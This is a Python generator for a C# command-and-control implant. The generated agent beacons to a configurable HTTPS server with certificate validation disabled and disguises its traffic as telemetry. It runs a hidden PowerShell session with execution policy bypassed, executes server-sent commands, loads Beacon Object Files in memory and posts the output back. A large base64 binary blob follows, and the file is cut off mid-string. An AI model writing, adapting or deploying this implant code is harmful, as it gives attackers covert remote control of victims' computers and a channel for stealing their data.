import json
import os
import base64

def _cs_escape(s: str) -> str:
	return s.replace("\\", "\\\\").replace('"','\\"')

def _emit_header_lines(headers: dict, var: str, is_post: bool=False) -> str:
	lines = []
	for k, v in (headers or {}).items():
		if is_post and k.lower() == "content-type":
			lines.append(f'{var}.Content = "new StringContent(json, Encoding.UTF8, {_cs_escape(v)})";')
		else:
			lines.append(f'{var}.Headers.TryAddWithoutValidation("{_cs_escape(k)}", "{_cs_escape(v)}");')
	return "\n".join(lines)

def _emit_post_json_expr(mapping: dict | None) -> str:
	#env = (envelope or "base64-json").lower()
	m = mapping or {"output": "{{payload}}"}
	templ = json.dumps(m, separators=(",", ":"), ensure_ascii=False)
	templ = _cs_escape(templ)
	repl = "\" + outB64 + \""
	templ = templ.replace("{{payload}}", repl)
	return f"\"{templ}\""


def program(ip, port, cfg=None, scheme="https", profile=False):
	base_url = f"{scheme}://{ip}:{port}"
	if profile:
		print(cfg)
		ua = cfg.useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		get_url  = base_url.rstrip("/") + cfg.get_uri
		post_url = base_url.rstrip("/") + cfg.post_uri
		get_headers  = _emit_header_lines(cfg.headers_get, "getReq", is_post=False)
		post_headers = _emit_header_lines(cfg.headers_post, "postReq", is_post=True)
		accept_line = f'getReq.Headers.Accept.ParseAdd("{_cs_escape(cfg.accept)}");' if cfg.accept else ""
		host_line   = f'getReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host)}");'     if cfg.host else ""
		#range_line  = f'getReq.Headers.Range = new RangeHeaderValue(0, {int(cfg.byte_range)});'  if cfg.byte_range else ""
		try:
			if getattr(cfg, "byte_range", None) is not None and str(cfg.byte_range).strip().isdigit():
				range_line = f'getReq.Headers.Range = new RangeHeaderValue(0, {int(cfg.byte_range)});'
			else:
				range_line = ""
		except Exception:
			range_line = ""

		accept_post = f'postReq.Headers.Accept.ParseAdd("{_cs_escape(cfg.accept_post)})";' if cfg.accept_post else ""
		host_post = f'postReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host_post)}");' if cfg.host_post else ""
		# we keep your two sleeps but drive them from interval if provided
		sleep_short = int((cfg.interval_ms or 4000) * 0.5)
		if cfg.interval_ms:
			cfg.interval_ms = int(cfg.interval_ms) * 1000

		sleep_long  = int(cfg.interval_ms or 5000)
		# build extraction regex union from mapping
		probe_keys = []

		def _collect(d, path):
			for k, v in d.items():
				if isinstance(v, dict):
					_collect(v, path + [k])
				elif isinstance(v, str) and "{{payload}}" in v:
					probe_keys.append(".".join(path + [k]))

		_collect(cfg.get_server_mapping or {}, [])

		regexes = [
			f'\"{_cs_escape(k.split(".")[-1])}\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"'
			for k in probe_keys
		]

		regexes += [
			'\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
			'\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
			'\"output\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
		]

		probe_union = "|".join(f"(?:{r})" for r in regexes)

		post_json_expr = _emit_post_json_expr(getattr(cfg, "post_client_mapping", None))

	else:
		"""# legacy hardcoded defaults
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		get_url = post_url = f"{base_url}/"
		get_headers = post_headers = ""
		accept_line = host_line = range_line = ""
		accept_post = ""
		sleep_short, sleep_long = 2000, 5000
		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'"""
		# legacy hardcoded defaults
		
		ua = cfg.useragent if cfg.useragent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		get_url = post_url = f"{base_url}/"
		get_headers = cfg.headers_get if cfg.headers_get else ""
		post_headers = cfg.headers_post if cfg.headers_post else ""
		accept_line = cfg.accept if cfg.accept else ""
		host_line = cfg.host if cfg.host else ""
		range_line = cfg.byte_range if cfg.byte_range else ""
		accept_post = ""
		sleep_short, sleep_long = cfg.interval_ms, 5000
		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'

	MAIN_CS = f"""
using RunOF.Internals;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace RunOF
{{
	class Program
	{{
		private const int ERROR_INVALID_COMMAND_LINE = 0x667;
		private static byte[] file_bytes;

		public static void Main(string[] args)
		{{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			MainAsync(args).GetAwaiter().GetResult();
		}}

		static readonly object _logLock = new object();
		static string _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "debug.log");
		private static bool bof_exec;

		internal static void Log(string msg, Exception ex = null)
		{{
			try
			{{
				var line = $"[{{DateTime.UtcNow:O}}] {{msg}}" + (ex != null ? $" | EX: {{ex}}" : "");
				lock (_logLock) File.AppendAllText(_logPath, line + Environment.NewLine, Encoding.UTF8);
			}}
			catch {{ /* avoid crashing on logging errors */ }}
		}}

		static bool ExtractOP(string text, out string opId)
		{{
			try
			{{
				opId = null;
				bool hasConsole = Regex.IsMatch(text, @"(?mi)^\\s*Write-Output\\s+""__(?:END)?OP__console__"";?\\s*$");
				var m = Regex.Match(text, @"(?mi)^\\s*Write-Output\\s+""__(?:END)?OP__(?<op>[A-Za-z0-9_-]+)__"";?\\s*$");

				if (hasConsole)
				{{
					Log("Found Console in OPID regex match");
					opId = "console";
					return true;
				}}
				else
				{{
					opId = m.Success ? m.Groups["op"].Value : null;
					return true;
				}}
			}}
			catch {{
				opId = null;
				return false;
			}}
		}}

		static bool SendProgramType(string test, string ID, out string formatted_val)
		{{
			try
			{{
				formatted_val = test;
				formatted_val = Regex.Replace(test, $@"(?mi)^\\s*Write-Output\\s+""__OP__{{ID}}__"";?\\s*$", "");
				formatted_val = Regex.Replace(test, $@"(?mi)^\\s*Write-Output\\s+""__ENDOP__{{ID}}__"";?\\s*$", "");
				Log($"Searching string for program string: programchecktyperightnow");
				if (formatted_val.IndexOf("programchecktyperightnow", StringComparison.OrdinalIgnoreCase) >= 0)
				{{
					Log("Found program check");
					return true;
				}}
				else
				{{
					Log("Didn't find program string");
					return false;
				}}
			}}
			catch {{
				formatted_val = null;
				return false;
			}}


		}}

		static bool TryExtractBofexec(string text, string ID, out string b64)
		{{
			b64 = null;
			if (string.IsNullOrEmpty(text)) return false;

			// Fast precheck to avoid regex work
			if (text.IndexOf("bofexec", StringComparison.OrdinalIgnoreCase) < 0) return false;

			// Remove noisy PS markers if present
			text = Regex.Replace(text, $@"(?mi)^\\s*Write-Output\\s+""__OP__{{ID}}__"";?\\s*$", "");
			text = Regex.Replace(text, $@"(?mi)^\\s*Write-Output\\s+""__ENDOP__{{ID}}__"";?\\s*$", "");

			foreach (var raw in text.Replace("\\r\\n", "\\n").Split(new[] {{ '\\n' }}, StringSplitOptions.None))
			{{
				var line = raw.Trim();
				if (line.Length == 0) continue;

				// bofexec <BASE64>  (captures b64 token)
				var m = Regex.Match(line, @"\\bbofexec\\b\\s+(?<b64>[A-Za-z0-9+/=]+)", RegexOptions.IgnoreCase);
				if (m.Success)
				{{
					b64 = m.Groups["b64"].Value;
					return true;
				}}
			}}
			return false;
		}}

		public static async Task MainAsync(string[] args)
		{{
			// 1) Generate a persistent SID
			var sid = GenerateSid();

			// 2) Endpoints (profile-aware)
			var getUrl = "{_cs_escape(get_url)}";
			var postUrl = "{_cs_escape(post_url)}";
			Log($"GET URL: {{getUrl}}  POST URL: {{postUrl}}");

			// 3) Start a hidden, persistent PowerShell process
			var psi = new ProcessStartInfo
			{{
				FileName = "powershell.exe",
				Arguments = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
				RedirectStandardInput = true,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true,
			}};
			var ps = Process.Start(psi);
			if (ps == null)
			{{
				return;
			}}

			var outMem = new MemoryStream();
			var errMem = new MemoryStream();
			Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) {{ IsBackground = true }};
			Thread tErr = new Thread(() => CopyStream(ps.StandardError.BaseStream, errMem)) {{ IsBackground = true }};
			tOut.Start();
			tErr.Start();

			var psIn = ps.StandardInput;

			// 4) Main loop
			while (true)
			{{

				try
				{{
					var handler = new HttpClientHandler
					{{
						ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
					}};

					using (var client = new HttpClient(handler) {{ BaseAddress = new Uri(getUrl) }})
					{{
						var getReq = new HttpRequestMessage(HttpMethod.Get, getUrl);
						getReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
						getReq.Headers.UserAgent.ParseAdd("{_cs_escape(ua)}");
						{accept_line}
						{host_line}
						{range_line}
						{get_headers}

						var getResp = await client.SendAsync(getReq);
						Log($"Sending GET: uri={{getReq.RequestUri}} headers=[{{string.Join(";", getReq.Headers)}}]");
						var body = await getResp.Content.ReadAsStringAsync();
						Log($"GET status={{(int)getResp.StatusCode}} len={{body?.Length ?? 0}}");
						bof_exec = false;

						Log($"Got Body: {{body}}");

						var cmdB64 = ParseTelemetry(body);
						if (!string.IsNullOrEmpty(cmdB64))
						{{
							var cmdBytes = Convert.FromBase64String(cmdB64);
							var cmdText = Encoding.UTF8.GetString(cmdBytes);

							

							Log($"Got command {{cmdText}}");

							string opId = null;
							if (ExtractOP(cmdText, out opId))
							{{
								opId = opId;
							}}
							else
							{{
								opId = null;
								if (Exit(psIn, ps, "console"))
								{{
									Environment.Exit(0);
								}}
								else
								{{
									Environment.Exit(0);
								}}
							}}

							//if (cmdText.StartsWith("bofexec ", StringComparison.OrdinalIgnoreCase))
							if (TryExtractBofexec(cmdText, opId, out var b64))
							{{
								Log("Entered BOF if case");
								bof_exec = true;
								ParsedArgs ParsedArgs;
								try
								{{
									string[] parts = cmdText.Split(new[] {{ ' ' }});
									Log("Split cmdText into indexs using spaces");
									if (parts.Length > 1)
									{{
										Log($"Set OPID to {{opId}}");

										Log("Length of parts is greater than 1 attempting to decode base64 BOF");
										file_bytes = Convert.FromBase64String(b64);
										Log("Decoded base64 into file bytes of BOF");
										Log("About to parse BOF arguments");

										int bofIdx = Array.FindIndex(parts, p => p.Equals("bofexec", StringComparison.OrdinalIgnoreCase));
										var remaining = parts.Skip(bofIdx + 2);

										var argv = new[] {{ "bofexec", b64 }}.Concat(remaining).ToArray();

										ParsedArgs = new ParsedArgs(argv);
										Log("Successfully Parsed arguments for BOF About to initalize BOF runner");

										Log("About to initalize Bof Runner!");
										BofRunner bof_runner = new BofRunner(ParsedArgs);
										Log("Successfully Initalized BOF Runner");

										bof_runner.LoadBof();
										var Result = bof_runner.RunBof((uint)ParsedArgs.thread_timeout);
										Log($"Got BOF result {{Result.Output}}");

										var outBytes = Encoding.UTF8.GetBytes(Result.Output);
										Log($"Got output Bytes from BOF: {{outBytes}}");
										var outB64 = Convert.ToBase64String(outBytes);

										SendPowerShellLines(psIn,
											$"Write-Output __OP__{{opId}}__",
											$"$b64='{{outB64}}'",
											"$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))",
											"Write-Output $s",
											$"Write-Output __ENDOP__{{opId}}__");

										//Log($"Sending command {{command}} to standard input!");
									}}
									else
									{{
										Log("Length of parts is less than 1");
										return;
									}}


								}}
								catch (Exception ex)
								{{
									Log($"Hit exception in BOF built in shell executor {{ex}}");
									return;
								}}

							}}
							else
							{{
								if (ExtractOP(cmdText, out opId))
								{{
									opId = opId;
								}}
								else
								{{
									if (Exit(psIn, ps, opId))
									{{
										Environment.Exit(0);
									}}
									else {{
										Environment.Exit(0);
									}}
								}}

								Log($"Found OPID {{opId}}");

								if (SendProgramType(cmdText, opId, out string formatted_val))
								{{
									Log($"Using OPID {{opId}} for program check");
									SendPowerShellLines(psIn,
										$"Write-Output __OP__{{opId}}__",
										"Write-Output specialprogram",
										$"Write-Output __ENDOP__{{opId}}__");
								}}
								else
								{{
									Log($"Sending normal command since bofexec was not found: {{cmdText}}");
									psIn.WriteLine(cmdText);
									psIn.Flush();
								}}
							}}
						}}

						bof_exec = false;
						Log($"Bof_exec var is: {{bof_exec}}");

						if (!bof_exec)
						{{
							Thread.Sleep({sleep_short});

							string outRaw;
							lock (outMem)
							{{
								outMem.Position = 0;
								errMem.Position = 0;
								var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
								var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
								outRaw = stdout + stderr;
								outMem.SetLength(0);
								errMem.SetLength(0);
							}}

							Log($"Got Output from powershell process: {{outRaw}}");

							var outBytes = Encoding.UTF8.GetBytes(outRaw);
							var outB64 = Convert.ToBase64String(outBytes);
							var json = {post_json_expr};

							Log($"Sending json {{json}}");

							var postReq = new HttpRequestMessage(HttpMethod.Post, postUrl);
							postReq.Headers.UserAgent.ParseAdd("{_cs_escape(ua)}");
							postReq.Content = new StringContent(json, Encoding.UTF8, "application/json");
							postReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
							{post_headers}

							Log($"POSTing json length={{json.Length}}");
							var postResp = await client.SendAsync(postReq);
							var respBody = await postResp.Content.ReadAsStringAsync();
							Log($"POST status={{(int)postResp.StatusCode}} len={{respBody?.Length ?? 0}}");
						}}
					}}
				}}
				catch (Exception ex)
				{{
					Log("Unhandled error", ex);
				}}

				Thread.Sleep({sleep_long});
			}}
		}}

		static void SendPowerShellLines(StreamWriter stdin, params string[] lines)
		{{
			foreach (var line in lines)
				stdin.WriteLine(line);

			stdin.WriteLine();
			stdin.Flush();
		}}

		static void CopyStream(Stream input, Stream output)
		{{
			var buffer = new byte[4096];
			int read;
			try
			{{
				while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
				{{
					output.Write(buffer, 0, read);
					output.Flush();
				}}
			}}
			catch
			{{
			}}
		}}

		static bool Exit(StreamWriter input, Process point, string ID)
		{{
			SendPowerShellLines(input,
				$"Write-Output __OP__{{ID}}__",
				"Write-Output Ending",                       
				$"Write-Output __ENDOP__{{ID}}__");

			try {{
				input.Close();
			}}
			catch {{ }}

			try
			{{
				point.Kill();
			}}
			catch {{ }}

			try
			{{
				point.Dispose();
			}}
			catch {{ }}
			return true;
		}}

		static string GenerateSid()
		{{
			const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
			int seed = (int)DateTime.UtcNow.Ticks ^ Process.GetCurrentProcess().Id;
			var rnd = new Random(seed);
			var sb = new StringBuilder(3 * 5 + 2);
			for (int seg = 0; seg < 3; seg++)
			{{
				for (int i = 0; i < 5; i++)
					sb.Append(chars[rnd.Next(chars.Length)]);
				if (seg < 2) sb.Append('-');
			}}
			return sb.ToString();
		}}

		static string ParseTelemetry(string resp)
		{{
			var m = Regex.Match(resp, "{_cs_escape(probe_union)}");
			if (m.Success)
			{{
				return m.Groups["b64"].Value;
			}} else {{
				return null;
			}}
		
		}}
	}}
}}
"""
	return MAIN_CS

BOFRUNNER_CS = """
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading.Tasks;
using static RunOF.Program;

namespace RunOF.Internals
{
	class BofRunner
	{
		private readonly Coff beacon_helper;
		private Coff bof;
		public IntPtr entry_point;
		private readonly IAT iat;
		public ParsedArgs parsed_args;

		public static void DumpManifestResources()
		{
			var asm = Assembly.GetExecutingAssembly();
			var names = asm.GetManifestResourceNames();
			Log("Manifest resources:\\n- " + string.Join("\\n- ", names));
		}

		public BofRunner(ParsedArgs parsed_args)
		{
			try
			{
				this.parsed_args = parsed_args;

				this.iat = new IAT();

				Log("Set the current context variables for parsed_args and IAT");

				Log("Initalized Beacon_funcs as a byte array");

				DumpManifestResources();

				Log("Initalizing resource_names via Assembly");
				string[] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();

				Log("Checking if resource_names contains beacon_funcs");
				Log($"Resource Names: {string.Join(", ", resource_names)}");

				string beacon_funcs_b64 = "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